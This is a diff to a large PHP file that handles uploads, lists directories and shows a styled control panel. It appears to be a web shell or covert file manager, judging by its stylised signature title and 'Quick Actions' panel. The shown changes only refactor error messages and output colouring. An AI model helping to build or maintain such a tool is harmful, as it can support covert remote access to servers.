@@ -3595,7 +3595,8 @@ if (isset($_FILES['upload_file'])) {
                         ];
                     } else {
                         $failedCount++;
-                        $errorMsg = error_get_last()['message'] ?? 'Unknown error';
+                        $lastError = error_get_last();
+                        $errorMsg = ($lastError && isset($lastError['message'])) ? $lastError['message'] : 'Unknown error';
                         $failedFiles[] = [
                             'name' => $fileName,
                             'reason' => 'Move failed: ' . $errorMsg
@@ -3603,7 +3604,7 @@ if (isset($_FILES['upload_file'])) {
                     }
                 } else {
                     $failedCount++;
-                    $errorMsg = $uploadErrorMessages[$fileError] ?? 'Unknown error (code: ' . $fileError . ')';
+                    $errorMsg = isset($uploadErrorMessages[$fileError]) ? $uploadErrorMessages[$fileError] : 'Unknown error (code: ' . $fileError . ')';
                     $failedFiles[] = [
                         'name' => $fileName,
                         'reason' => $errorMsg
@@ -3963,7 +3964,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2036</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2054</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4062,7 +4063,29 @@ function list_dir($path) {
         <?php echo list_dir($dir) ?>
     </div>
 </div>
-<?php if (!empty($output)): ?>
+<?php if (!empty($output)): 
+    // Determine color and status based on output prefix
+    $outputPrefix = isset($output[0]) ? $output[0] : '';
+    // Use ASCII characters for checking to avoid multi-byte issues
+    $checkOutput = $output;
+    if (strpos($checkOutput, "\xe2\x9c\x85") === 0) { // ✅
+        $borderColor = '#0f0';
+        $titleColor = '#0f0';
+        $statusText = 'Success';
+    } elseif (strpos($checkOutput, "\xe2\x9a\xa0\xef\xb8\x8f") === 0) { // ⚠️
+        $borderColor = '#ff0';
+        $titleColor = '#ff0';
+        $statusText = 'Warning';
+    } elseif (strpos($checkOutput, "\xe2\x9d\x8c") === 0) { // ❌
+        $borderColor = '#f44';
+        $titleColor = '#f44';
+        $statusText = 'Error';
+    } else {
+        $borderColor = '#6cf';
+        $titleColor = '#6cf';
+        $statusText = 'Info';
+    }
+?>
 <div id="uploadOutput" style="
     position: fixed;
     top: 20px;
@@ -4071,7 +4094,7 @@ function list_dir($path) {
     max-height: 300px;
     overflow: auto;
     background: #1a1a1a;
-    border: 2px solid <?php echo (strpos($output, '✅') === 0) ? '#0f0' : (strpos($output, '⚠️') === 0) ? '#ff0' : (strpos($output, '❌') === 0) ? '#f44' : '#6cf'; ?>;
+    border: 2px solid <?php echo $borderColor; ?>;
     border-radius: 8px;
     padding: 15px;
     z-index: 9999;
@@ -4083,8 +4106,8 @@ function list_dir($path) {
     animation: slideIn 0.3s ease;
 ">
     <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-        <span style="font-weight: bold; color: <?php echo (strpos($output, '✅') === 0) ? '#0f0' : (strpos($output, '⚠️') === 0) ? '#ff0' : (strpos($output, '❌') === 0) ? '#f44' : '#6cf'; ?>;">
-            <?php echo (strpos($output, '✅') === 0) ? '✅ Success' : (strpos($output, '⚠️') === 0) ? '⚠️ Warning' : (strpos($output, '❌') === 0) ? '❌ Error' : 'ℹ️ Info'; ?>
+        <span style="font-weight: bold; color: <?php echo $titleColor; ?>;">
+            <?php echo $statusText; ?>
         </span>
         <button onclick="this.parentElement.parentElement.remove();" style="background: none; border: none; color: #888; cursor: pointer; font-size: 16px;">×</button>
     </div>
